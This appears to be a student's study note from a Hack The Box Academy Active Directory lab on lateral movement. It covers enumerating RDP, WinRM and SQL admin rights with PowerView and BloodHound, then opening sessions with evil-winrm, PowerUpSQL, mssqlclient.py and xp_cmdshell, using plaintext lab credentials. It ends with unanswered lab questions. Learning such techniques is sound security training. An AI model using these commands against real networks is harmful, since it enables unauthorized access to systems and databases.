#LateraMovement

>[!Info] Moving Around a Windows Domain
> A few ways to navigate a Windows domain with the remote access privileges of a user. All of which can be enumerated with PowerView:
> - RDP via `CanRDP`
> - PowerShell Remoting via `CanPSRemote`
> - MSSQL Server via `SQLAdmin`


## RDP

##### Enumerating the Remote Desktop Users Group

*Uses PowerView*
```go
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

##### Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound

![[Pasted image 20260426063713.png]]

##### Checking Remote Access Rights using BloodHound
![[Pasted image 20260426063755.png]]

>[!tip] 
>On the Analysis tab you can run the following pre-built queries to find users who have RDP rights:
```go
Find Workstations where Domain Users can RDP
```
```go
Find Servers where Domain Users can RDP
```

-------------------------
### WinRM

>[!INFO]
> Use the PowerView function `Get-NetLocalGroupMember` to enumerate the `Remote Management Users`

##### Enumerating the Remote Management Users Group
```go
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

##### Cypher Query

>[!info]
> Utilize BloodHound's the Cypher Query to hunt for users with access to the Remote Management Users group. This query and others can be added as a custom query to the BloodHound installation.

```go
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20260426072146.png]]

##### Establishing WinRM Session from Windows - PowerShell Remoting
```go
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
```

```go
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
```

```go
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

##### Evil-WinRM
```go
evil-winrm -i 10.129.201.234 -u forend
```


-----------------------


### SQL Server Admin

The [Snaffler](https://github.com/SnaffCon/Snaffler/releases) tool is great for finding SQL creds

>[!info]
> Use BloodHound to find SQL Admin access with the SQLAdmin edge in BloodHound. On the Node Info tab use `SQL Admin Rights` or submit the below custom query
```go
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

>[!tip]
> This query reveals the user `damundsen` has rights over a domain, we can use `wley` to change that users password and authenticate to the target using the tool PowerUpSQL

##### Enumerating MSSQL Instances with PowerUpSQL
```go
Import-Module .\PowerUpSQL.ps1
```

This will show `damundsen` access to the host `ACADEMY-EA-DB01`
```go
Get-SQLInstanceDomain
```

```go
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

Authenticate from Linux via Impacket's mssqlclient

##### Running mssqlclient.py Against the Target
```go
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

##### View options
```go
help
```

##### enable_xp_cmdshell
allows for one to execute operating system commands via the database if the account in question has the proper access rights.

```go
enable_xp_cmdshell
```

##### Enumerating our Rights on the System using xp_cmdshell
```go
xp_cmdshell whoami /priv
```

-----------------------

RDP
```go
xfreerdp /v:10.129.66.204 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/ACE /smart-sizing:2400x1200 /cert:ignore
```

mssqlclient
```go
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.225 -windows-aut
```


evil-winrm
```go
evil-winrm -i 172.16.5.225 -u htb-student
```

# Questions

### Questions 1: What other user in the domain has CanPSRemote rights to a host?

Answer
```go

```

### Question 2: What host can this user access via WinRM? (just the computer name)

Answer
```go

```

### Question 3: contents of the flag at C:\Users\damundsen\Desktop\flag.txt.

Answer
```go

```